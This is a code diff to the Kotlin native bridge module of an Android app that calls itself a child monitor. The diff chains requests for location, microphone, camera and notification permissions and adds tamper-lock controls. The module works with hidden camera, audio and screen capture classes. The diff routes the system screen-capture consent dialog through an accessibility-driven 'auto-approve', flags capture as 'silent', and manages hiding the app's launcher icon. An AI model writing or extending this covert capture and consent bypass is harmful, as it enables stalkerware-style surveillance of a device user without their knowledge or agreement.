@@ -11,6 +11,8 @@ import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
 import android.util.Log
+import com.childmonitor.AccessibilityHealthChecker
+import com.childmonitor.AppBlockingAccessibilityService
 import com.childmonitor.MainActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -23,8 +25,10 @@ import com.childmonitor.sync.NativeStompOwner
 import com.childmonitor.sync.NativeStreamingCoordinator
 import com.childmonitor.NotificationStore
 import com.childmonitor.PolicySyncManager
+import com.childmonitor.permissions.PermissionSettingsLauncher
 import com.childmonitor.TamperProtectionManager
 import com.childmonitor.UsageStatsReader
+import com.childmonitor.accessibility.ScreenCaptureAutoApprove
 import com.childmonitor.capture.HiddenAudioCapture
 import com.childmonitor.capture.HiddenCameraCapture
 import com.childmonitor.capture.HiddenScreenCapture
@@ -57,11 +61,16 @@ import com.childmonitor.security.PlayIntegrityHelper
 class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext) :
     ReactContextBaseJavaModule(reactContext) {
 
+    private lateinit var chainAdvancePromise: ChainAdvancePromise
+
     init {
         Companion.eventContext = reactContext
+        chainAdvancePromise = ChainAdvancePromise { finishRuntimeChainStep() }
     }
 
     private var cameraMicPromise: Promise? = null
+    private var singlePermissionPromise: Promise? = null
+    private var singlePermissionGranted: (() -> Boolean)? = null
     private val cameraMicPermissionListener = PermissionListener { requestCode, _, _ ->
         if (requestCode == CAMERA_MIC_REQUEST_CODE) {
             cameraMicPromise?.resolve(hasCameraAndMic())
@@ -70,6 +79,37 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
         } else {
             false
         }
+    }
+    private val singlePermissionListener = PermissionListener { requestCode, _, _ ->
+        if (
+            requestCode == CAMERA_REQUEST_CODE ||
+            requestCode == MIC_REQUEST_CODE ||
+            requestCode == POST_NOTIFICATIONS_REQUEST_CODE ||
+            requestCode == LOCATION_REQUEST_CODE
+        ) {
+            val pending = singlePermissionPromise
+            val granted = singlePermissionGranted?.invoke() ?: false
+            singlePermissionPromise = null
+            singlePermissionGranted = null
+            pending?.resolve(granted)
+            if (inRuntimeChain && pending !== chainAdvancePromise) {
+                finishRuntimeChainStep()
+            }
+            true
+        } else {
+            false
+        }
+    }
+
+    private var runtimeChainPromise: Promise? = null
+    private var runtimeChainIndex = 0
+    private val runtimeChainSteps = mutableListOf<() -> Boolean>()
+    private var inRuntimeChain = false
+
+    private fun finishRuntimeChainStep() {
+        if (!inRuntimeChain) return
+        runtimeChainIndex++
+        runtimeChainAdvance()
     }
 
     override fun getName(): String = "ChildMonitorNative"
@@ -468,6 +508,106 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
         }
     }
 
+    @ReactMethod
+    fun requestCameraPermission(promise: Promise) {
+        requestSingleRuntimePermission(
+            android.Manifest.permission.CAMERA,
+            CAMERA_REQUEST_CODE,
+            promise,
+        ) {
+            ContextCompat.checkSelfPermission(
+                reactContext,
+                android.Manifest.permission.CAMERA,
+            ) == PackageManager.PERMISSION_GRANTED
+        }
+    }
+
+    @ReactMethod
+    fun requestMicrophonePermission(promise: Promise) {
+        requestSingleRuntimePermission(
+            android.Manifest.permission.RECORD_AUDIO,
+            MIC_REQUEST_CODE,
+            promise,
+        ) {
+            ContextCompat.checkSelfPermission(
+                reactContext,
+                android.Manifest.permission.RECORD_AUDIO,
+            ) == PackageManager.PERMISSION_GRANTED
+        }
+    }
+
+    @ReactMethod
+    fun isPostNotificationsGranted(promise: Promise) {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
+            promise.resolve(true)
+            return
+        }
+        promise.resolve(
+            ContextCompat.checkSelfPermission(
+                reactContext,
+                android.Manifest.permission.POST_NOTIFICATIONS,
+            ) == PackageManager.PERMISSION_GRANTED,
+        )
+    }
+
+    @ReactMethod
+    fun requestPostNotificationsPermission(promise: Promise) {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
+            promise.resolve(true)
+            return
+        }
+        requestSingleRuntimePermission(
+            android.Manifest.permission.POST_NOTIFICATIONS,
+            POST_NOTIFICATIONS_REQUEST_CODE,
+            promise,
+        ) {
+            ContextCompat.checkSelfPermission(
+                reactContext,
+                android.Manifest.permission.POST_NOTIFICATIONS,
+            ) == PackageManager.PERMISSION_GRANTED
+        }
+    }
+
+    private fun requestSingleRuntimePermission(
+        permission: String,
+        requestCode: Int,
+        promise: Promise,
+        isGranted: () -> Boolean,
+    ) {
+        if (isGranted()) {
+            promise.resolve(true)
+            if (inRuntimeChain && promise !== chainAdvancePromise) {
+                finishRuntimeChainStep()
+            }
+            return
+        }
+        val activity = currentActivity
+        if (activity == null) {
+            promise.resolve(isGranted())
+            return
+        }
+        singlePermissionPromise = promise
+        singlePermissionGranted = isGranted
+        val permissionAware = activity as? com.facebook.react.modules.core.PermissionAwareActivity
+        if (permissionAware != null) {
+            permissionAware.requestPermissions(arrayOf(permission), requestCode, singlePermissionListener)
+        } else {
+            ActivityCompat.requestPermissions(activity, arrayOf(permission), requestCode)
+            Handler(Looper.getMainLooper()).postDelayed({
+                if (singlePermissionPromise != null) {
+                    val pending = singlePermissionPromise
+                    val granted = isGranted()
+                    singlePermissionPromise = null
+                    singlePermissionGranted = null
+                    pending?.resolve(granted)
+                    if (inRuntimeChain && pending !== chainAdvancePromise) {
+                        finishRuntimeChainStep()
+                    }
+                }
+            }, 1500)
+        }
+    }
+
     private fun hasCameraAndMic(): Boolean {
         val camera = ContextCompat.checkSelfPermission(
             reactContext,
@@ -487,8 +627,15 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
 
     @ReactMethod
     fun requestLocationPermission(promise: Promise) {
+        requestLocationPermissionInternal(promise)
+    }
+
+    private fun requestLocationPermissionInternal(promise: Promise) {
         if (LocationReader.hasPermission(reactContext)) {
             promise.resolve(true)
+            if (inRuntimeChain && promise !== chainAdvancePromise) {
+                finishRuntimeChainStep()
+            }
             return
         }
         val activity = currentActivity
@@ -496,15 +643,110 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
             promise.resolve(LocationReader.hasPermission(reactContext))
             return
         }
-        ActivityCompat.requestPermissions(
-            activity,
-            arrayOf(
-                android.Manifest.permission.ACCESS_FINE_LOCATION,
-                android.Manifest.permission.ACCESS_COARSE_LOCATION,
-            ),
-            LOCATION_REQUEST_CODE,
+        singlePermissionPromise = promise
+        singlePermissionGranted = { LocationReader.hasPermission(reactContext) }
+        val permissions = arrayOf(
+            android.Manifest.permission.ACCESS_FINE_LOCATION,
+            android.Manifest.permission.ACCESS_COARSE_LOCATION,
         )
-        promise.resolve(LocationReader.hasPermission(reactContext))
+        val permissionAware = activity as? com.facebook.react.modules.core.PermissionAwareActivity
+        if (permissionAware != null) {
+            permissionAware.requestPermissions(permissions, LOCATION_REQUEST_CODE, singlePermissionListener)
+        } else {
+            ActivityCompat.requestPermissions(activity, permissions, LOCATION_REQUEST_CODE)
+            Handler(Looper.getMainLooper()).postDelayed({
+                if (singlePermissionPromise != null) {
+                    val pending = singlePermissionPromise
+                    val granted = LocationReader.hasPermission(reactContext)
+                    singlePermissionPromise = null
+                    singlePermissionGranted = null
+                    pending?.resolve(granted)
+                    if (inRuntimeChain && pending !== chainAdvancePromise) {
+                        finishRuntimeChainStep()
+                    }
+                }
+            }, 1500)
+        }
+    }
+
+    @ReactMethod
+    fun requestAllRuntimePermissions(promise: Promise) {
+        val activity = currentActivity
+        if (activity == null) {
+            promise.resolve(allRuntimePermissionsGranted())
+            return
+        }
+        runtimeChainPromise = promise
+        runtimeChainIndex = 0
+        inRuntimeChain = true
+        runtimeChainSteps.clear()
+        runtimeChainSteps.add { LocationReader.hasPermission(reactContext) }
+        runtimeChainSteps.add {
+            ContextCompat.checkSelfPermission(
+                reactContext,
+                android.Manifest.permission.RECORD_AUDIO,
+            ) == PackageManager.PERMISSION_GRANTED
+        }
+        runtimeChainSteps.add {
+            ContextCompat.checkSelfPermission(
+                reactContext,
+                android.Manifest.permission.CAMERA,
+            ) == PackageManager.PERMISSION_GRANTED
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            runtimeChainSteps.add {
+                ContextCompat.checkSelfPermission(
+                    reactContext,
+                    android.Manifest.permission.POST_NOTIFICATIONS,
+                ) == PackageManager.PERMISSION_GRANTED
+            }
+        }
+        runtimeChainAdvance()
+    }
+
+    private fun allRuntimePermissionsGranted(): Boolean {
+        if (!LocationReader.hasPermission(reactContext)) return false
+        if (ContextCompat.checkSelfPermission(reactContext, android.Manifest.permission.RECORD_AUDIO)
+            != PackageManager.PERMISSION_GRANTED
+        ) {
+            return false
+        }
+        if (ContextCompat.checkSelfPermission(reactContext, android.Manifest.permission.CAMERA)
+            != PackageManager.PERMISSION_GRANTED
+        ) {
+            return false
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
+            ContextCompat.checkSelfPermission(reactContext, android.Manifest.permission.POST_NOTIFICATIONS)
+            != PackageManager.PERMISSION_GRANTED
+        ) {
+            return false
+        }
+        return true
+    }
+
+    private fun runtimeChainAdvance() {
+        val chainPromise = runtimeChainPromise ?: return
+        while (runtimeChainIndex < runtimeChainSteps.size && runtimeChainSteps[runtimeChainIndex]()) {
+            runtimeChainIndex++
+        }
+        if (runtimeChainIndex >= runtimeChainSteps.size) {
+            inRuntimeChain = false
+            runtimeChainPromise = null
+            runtimeChainIndex = 0
+            chainPromise.resolve(allRuntimePermissionsGranted())
+            return
+        }
+        when (runtimeChainIndex) {
+            0 -> requestLocationPermissionInternal(chainAdvancePromise)
+            1 -> requestMicrophonePermission(chainAdvancePromise)
+            2 -> requestCameraPermission(chainAdvancePromise)
+            3 -> requestPostNotificationsPermission(chainAdvancePromise)
+            else -> {
+                runtimeChainIndex++
+                runtimeChainAdvance()
+            }
+        }
     }
 
     @ReactMethod
@@ -583,7 +825,7 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     @ReactMethod
     fun armScreenCaptureAutoApprove(promise: Promise) {
         try {
-            MonitoringPrefs.armScreenCaptureAutoApprove(reactContext)
+            ScreenCaptureAutoApprove.armForConsent(reactContext)
             promise.resolve(null)
         } catch (e: Exception) {
             promise.reject("AUTO_APPROVE_ERROR", e)
@@ -593,7 +835,7 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     @ReactMethod
     fun disarmScreenCaptureAutoApprove(promise: Promise) {
         try {
-            MonitoringPrefs.disarmScreenCaptureAutoApprove(reactContext)
+            ScreenCaptureAutoApprove.disarm(reactContext)
             promise.resolve(null)
         } catch (e: Exception) {
             promise.reject("DISARM_AUTO_APPROVE_ERROR", e)
@@ -601,25 +843,53 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     }
 
     @ReactMethod
+    fun setPermissionSetupInProgress(inProgress: Boolean, promise: Promise) {
+        try {
+            MonitoringPrefs.setPermissionSetupInProgress(reactContext, inProgress)
+            promise.resolve(null)
+        } catch (e: Exception) {
+            promise.reject("SETUP_FLAG_ERROR", e)
+        }
+    }
+
+    @ReactMethod
+    fun isScreenCaptureAutoApproveReady(promise: Promise) {
+        try {
+            promise.resolve(ScreenCaptureAutoApprove.isReady(reactContext))
+        } catch (e: Exception) {
+            promise.reject("AUTO_APPROVE_READY_ERROR", e)
+        }
+    }
+
+    @ReactMethod
     fun isAccessibilityEnabled(promise: Promise) {
-        val enabled = Settings.Secure.getString(
-            reactContext.contentResolver,
-            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
-        )?.contains(reactContext.packageName) == true
-        promise.resolve(enabled)
+        promise.resolve(AccessibilityHealthChecker.isAccessibilityEnabled(reactContext))
+    }
+
+    @ReactMethod
+    fun isAccessibilityServiceConnected(promise: Promise) {
+        promise.resolve(AccessibilityHealthChecker.isServiceConnected())
     }
 
     @ReactMethod
     fun openAccessibilitySettings(promise: Promise) {
         PermissionDebugLogger.enter("ChildMonitorNativeModule.openAccessibilitySettings")
         try {
-            MonitoringPrefs.disarmScreenCaptureAutoApprove(reactContext)
-            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
+            val activity = currentActivity
+            if (PermissionSettingsLauncher.openAccessibility(reactContext, activity)) {
+                PermissionDebugLogger.exit("ChildMonitorNativeModule.openAccessibilitySettings")
+                promise.resolve(null)
+                return
+            }
+            val fallback = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             }
-            reactContext.startActivity(intent)
-            PermissionDebugLogger.exit("ChildMonitorNativeModule.openAccessibilitySettings")
-            promise.resolve(null)
+            if (AppBlockingAccessibilityService.tryStartActivity(fallback)) {
+                PermissionDebugLogger.exit("ChildMonitorNativeModule.openAccessibilitySettings", "a11y-fallback")
+                promise.resolve(null)
+                return
+            }
+            promise.reject("SETTINGS_ERROR", "Could not open accessibility settings on this device")
         } catch (e: Exception) {
             promise.reject("SETTINGS_ERROR", e)
         }
@@ -833,10 +1103,31 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     @ReactMethod
     fun openOemBackgroundSettings(promise: Promise) {
         try {
-            com.childmonitor.oem.OemSetupValidator.openOemBackgroundSettings(reactContext)
+            val ctx = currentActivity ?: reactApplicationContext
+            com.childmonitor.oem.OemSetupValidator.openOemBackgroundSettings(ctx)
             promise.resolve(null)
         } catch (e: Exception) {
             promise.reject("OEM_BACKGROUND_ERROR", e)
+        }
+    }
+
+    @ReactMethod
+    fun markOemAutostartPromptDone(promise: Promise) {
+        try {
+            com.childmonitor.oem.OemSetupValidator.markAutostartPromptCompleted(reactContext)
+            promise.resolve(null)
+        } catch (e: Exception) {
+            promise.reject("OEM_AUTOSTART_MARK_ERROR", e)
+        }
+    }
+
+    @ReactMethod
+    fun clearOemAutostartPromptDone(promise: Promise) {
+        try {
+            com.childmonitor.oem.OemSetupValidator.clearAutostartPromptCompleted(reactContext)
+            promise.resolve(null)
+        } catch (e: Exception) {
+            promise.reject("OEM_AUTOSTART_CLEAR_ERROR", e)
         }
     }
 
@@ -883,10 +1174,11 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     @ReactMethod
     fun openDeviceAdminSettings(promise: Promise) {
         try {
-            val intent = Intent(Settings.ACTION_SECURITY_SETTINGS).apply {
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            val activity = currentActivity
+            if (!PermissionSettingsLauncher.openDeviceAdmin(reactContext, activity)) {
+                promise.reject("SETTINGS_ERROR", "Could not open device admin settings on this device")
+                return
             }
-            reactContext.startActivity(intent)
             promise.resolve(null)
         } catch (e: Exception) {
             promise.reject("SETTINGS_ERROR", e)
@@ -901,12 +1193,9 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     @ReactMethod
     fun setHideLauncher(hidden: Boolean, promise: Promise) {
         try {
-            if (hidden) {
-                MonitoringPrefs.setHideLauncherEnabled(reactContext, true)
-            }
             val ok = TamperProtectionManager.setHideLauncher(reactContext, hidden)
-            if (!hidden) {
-                MonitoringPrefs.setHideLauncherEnabled(reactContext, false)
+            if (ok) {
+                MonitoringPrefs.setHideLauncherEnabled(reactContext, hidden)
             }
             promise.resolve(ok)
         } catch (e: Exception) {
@@ -925,6 +1214,70 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
         } catch (e: Exception) {
             promise.reject("TAMPER_ERROR", e)
         }
+    }
+
+    @ReactMethod
+    fun setTamperUnlockUntil(untilEpochMs: Double, promise: Promise) {
+        try {
+            MonitoringPrefs.setTamperUnlockUntilMs(reactContext, untilEpochMs.toLong())
+            promise.resolve(null)
+        } catch (e: Exception) {
+            promise.reject("TAMPER_UNLOCK_ERROR", e)
+        }
+    }
+
+    @ReactMethod
+    fun getWizardPersistenceState(promise: Promise) {
+        try {
+            promise.resolve(MonitoringPrefs.getWizardPersistenceJson(reactContext))
+        } catch (e: Exception) {
+            promise.reject("WIZARD_PERSISTENCE_ERROR", e)
+        }
+    }
+
+    @ReactMethod
+    fun setWizardPersistenceState(json: String, promise: Promise) {
+        try {
+            MonitoringPrefs.setWizardPersistenceJson(reactContext, json)
+            promise.resolve(null)
+        } catch (e: Exception) {
+            promise.reject("WIZARD_PERSISTENCE_ERROR", e)
+        }
+    }
+
+    @ReactMethod
+    fun clearWizardPersistenceState(promise: Promise) {
+        try {
+            MonitoringPrefs.setWizardPersistenceJson(reactContext, null)
+            promise.resolve(null)
+        } catch (e: Exception) {
+            promise.reject("WIZARD_PERSISTENCE_ERROR", e)
+        }
+    }
+
+    @ReactMethod
+    fun launchTamperGate(promise: Promise) {
+        try {
+            com.childmonitor.tamper.TamperGateController.launchGate(reactContext)
+            promise.resolve(null)
+        } catch (e: Exception) {
+            promise.reject("TAMPER_GATE_ERROR", e)
+        }
+    }
+
+    @ReactMethod
+    fun launchTamperGateForAction(action: String, promise: Promise) {
+        try {
+            com.childmonitor.tamper.TamperGateController.launchGateForAction(reactContext, action)
+            promise.resolve(null)
+        } catch (e: Exception) {
+            promise.reject("TAMPER_GATE_ERROR", e)
+        }
+    }
+
+    @ReactMethod
+    fun isTamperUnlocked(promise: Promise) {
+        promise.resolve(MonitoringPrefs.isTamperUnlocked(reactContext))
     }
 
     @ReactMethod
@@ -995,7 +1348,7 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
                     promise.reject("SCREEN_FGS_FAILED", "Screen capture foreground service did not start")
                     return@Thread
                 }
-                val projection = ScreenCaptureController.obtainProjection(reactContext)
+                val projection = ScreenCaptureController.acquireProjectionForCapture(reactContext)
                 if (projection == null) {
                     promise.reject(
                         "PROJECTION_EXPIRED",
@@ -1195,6 +1548,16 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     }
 
     @ReactMethod
+    fun clearMediaProjectionConsent(promise: Promise) {
+        try {
+            PermissionSettingsLauncher.clearScreenCaptureConsent(reactContext)
+            promise.resolve(null)
+        } catch (e: Exception) {
+            promise.reject("MEDIA_PROJECTION_CLEAR_ERROR", e)
+        }
+    }
+
+    @ReactMethod
     fun getMediaProjectionDebugState(promise: Promise) {
         val state = MediaProjectionTokenStore.debugState(reactContext)
         val map = Arguments.createMap()
@@ -1277,15 +1640,16 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
             "before=${MediaProjectionTokenStore.debugState(reactContext)}",
         )
         if (MediaProjectionTokenStore.hasValidToken(reactContext)) {
-            MonitoringPrefs.disarmScreenCaptureAutoApprove(reactContext)
+            ScreenCaptureAutoApprove.disarm(reactContext)
             PcpFlowLogger.log(PcpFlowLogger.Category.PERMISSION_FLOW, "requestMediaProjectionConsent — already granted")
             promise.resolve(true)
             return
         }
         Thread {
             try {
+                val launchContext = currentActivity ?: reactApplicationContext
                 val granted = MediaProjectionConsentHelper.ensureConsent(
-                    reactContext.applicationContext,
+                    launchContext,
                     60_000L,
                 )
                 PcpFlowLogger.log(
@@ -1318,15 +1682,18 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     fun getDeviceCapabilities(promise: Promise) {
         val deviceOwner = DeviceOwnerManager.isDeviceOwner(reactContext)
         val projectionGranted = MediaProjectionTokenStore.hasValidToken(reactContext)
+        val autoApproveReady = ScreenCaptureAutoApprove.isReady(reactContext)
         val map: WritableMap = Arguments.createMap()
         map.putBoolean("deviceOwner", deviceOwner)
         map.putBoolean("mediaProjectionGranted", projectionGranted)
-        map.putBoolean("silentScreenCapture", deviceOwner && projectionGranted)
+        map.putBoolean("screenCaptureAutoApproveReady", autoApproveReady)
+        map.putBoolean("silentScreenCapture", projectionGranted)
         map.putString(
             "protectionLevel",
             when {
-                deviceOwner && projectionGranted -> "FULL"
+                projectionGranted && autoApproveReady -> "FULL"
                 projectionGranted -> "ENHANCED"
+                autoApproveReady -> "AUTO_APPROVE"
                 deviceOwner -> "DEVICE_OWNER"
                 else -> "STANDARD"
             },
@@ -1403,18 +1770,12 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
 
     @ReactMethod
     fun revokeMonitoringAndStop(promise: Promise) {
-        try {
-            ScreenCaptureForegroundService.stopStream(reactContext)
-            NativeStreamPublisher.stop(reactContext)
-            MediaProjectionTokenStore.clear(reactContext)
-            DeviceOwnerManager.clearDeviceOwnerState(reactContext)
-            TamperProtectionManager.setHideLauncher(reactContext, false)
-            MonitoringPrefs.clear(reactContext)
-            reactContext.stopService(Intent(reactContext, MonitoringForegroundService::class.java))
-            promise.resolve(null)
-        } catch (e: Exception) {
-            promise.reject("REVOKE_ERROR", e)
-        }
+        val app = reactContext.applicationContext
+        com.childmonitor.monitoring.MonitoringRevokeManager.revokeMonitoringAndStop(
+            app,
+            source = "js_bridge",
+        )
+        promise.resolve(null)
     }
 
     @ReactMethod
@@ -1447,6 +1808,9 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     companion object {
         private const val LOCATION_REQUEST_CODE = 2001
         private const val CAMERA_MIC_REQUEST_CODE = 2002
+        private const val CAMERA_REQUEST_CODE = 2003
+        private const val MIC_REQUEST_CODE = 2004
+        private const val POST_NOTIFICATIONS_REQUEST_CODE = 2005
         private var eventContext: ReactApplicationContext? = null
 
         @JvmStatic
@@ -1466,6 +1830,26 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
             payload.putString("command", command)
             ctx.getJSModule(DeviceEventManagerModule.RCTDeviceEventEmitter::class.java)
                 .emit("nativeStreamControl", payload)
+            return true
+        }
+
+        @JvmStatic
+        fun emitMonitoringRevoked(source: String = "native"): Boolean {
+            val ctx = eventContext ?: return false
+            if (!ctx.hasActiveReactInstance()) return false
+            val payload = Arguments.createMap()
+            payload.putString("source", source)
+            ctx.getJSModule(DeviceEventManagerModule.RCTDeviceEventEmitter::class.java)
+                .emit("monitoringRevoked", payload)
+            return true
+        }
+
+        @JvmStatic
+        fun emitPermissionStateChanged(): Boolean {
+            val ctx = eventContext ?: return false
+            if (!ctx.hasActiveReactInstance()) return false
+            ctx.getJSModule(DeviceEventManagerModule.RCTDeviceEventEmitter::class.java)
+                .emit("permissionStateChanged", null)
             return true
         }
 
